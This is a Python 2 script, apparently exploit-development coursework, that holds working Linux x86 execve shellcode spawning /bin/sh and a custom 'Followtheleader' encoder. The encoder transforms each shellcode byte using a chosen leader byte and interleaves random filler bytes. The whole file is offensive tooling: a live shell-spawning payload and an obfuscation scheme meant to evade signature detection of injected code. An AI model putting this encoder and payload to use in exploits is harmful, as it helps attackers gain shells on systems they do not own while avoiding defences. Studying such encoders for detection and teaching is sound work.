#!/usr/bin/python
# Author:Konstantinos Alexiou  
# Encoding name: Followtheleader-encoder
# Description: Custom execve-shellcode encoder based on any given byte which is used as Leader byte encoding the shellcode
import random
import sys
shellcode =('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80')

total = len(sys.argv)
if total != 2:
	print '!!Give the LEADER byte' 
	print 'Script must run as: python xxx.py LEADER'
	print 'LEADER is any integer between 17-255'
	print 'e.g  python Followtheleader.py 32'
else:
    try:
	leader = int(sys.argv[1])
	fb = int(hex(leader)[2:3],16)		                          # Split the LEADER. If leader = AF -->fb=A
	sb = int(hex(leader)[3:],16)				          # Split the LEADER. If LEADER = AF -->sb=F
	encoded = ' '
	encoded2 = ' ' 
	encoded = '\\x'
	encoded += hex(leader)[2:]     	    	        		  # FIRST byte the LEADER 
	encoded2 = '0x'
	encoded2 += hex(leader)[2:]
	i=0
	for x in bytearray(shellcode):          	                  # READ every Instruction as BYTE  
		i +=1
		hopcode = '%02x' %x		             	          # KEEP only the HEX value of opcode
		Dec_hopcode = int(hopcode, 16)		      	          # CALCULATE the DECIMAL value of opcode 
		suplX = 255 - Dec_hopcode       		          # CALCULATE the SUPPLEMENT 
		rev_suplx = hex(suplX)[::-1]                              # REVERT the bytes of SUPPLEMENT (ae --> ea)
		subfs = fb-sb                        
#----------------------------The Encoded byte ----------------------------------------------------
   		xxx = hex(int(abs(subfs)) + int(rev_suplx[0:2],16))
#-------------------------------------------------------------------------------------------------
		if len(xxx)>4:				 	          # Check if xxx > 0xff
			print 'Overflow encoding.Try again!!!.'
			sys.exit()
		elif xxx == '0x0':					  # Check if ZERO byte was encoded 
	    		print 'A byte was Encoded as 0x00 .Try again!!!'
            		sys.exit()
		encoded +=  '\\x'           			          # Put \x first
		encoded +=  xxx[2:]         			          # Put the xxx afterwards
		insertByte = hex(random.randint(1,255))    	          # Put a Random byte 
		encoded += '\\x'            
		encoded += insertByte[2:]   
		i +=1
		encoded2 += ','
		encoded2 += xxx 
		encoded2 += ','           
		encoded2 += '0x'
		encoded2 += insertByte[2:]
	print ' *************';
	print ' LEADER BYTE :decimal(%d), HEX(0x%x)'  %(int(sys.argv[1]),leader)
	print ' *************';
	print 'Len of Shellcode: %02d' % i
	print '------------------------------------------------------------------------';
	print '   1. Style:= %s ' % encoded
	print '------------------------------------------------------------------------';
	print '   2. Style:= %s ' % encoded2
	print '------------------------------------------------------------------------';
    except:
	print "exiting..."
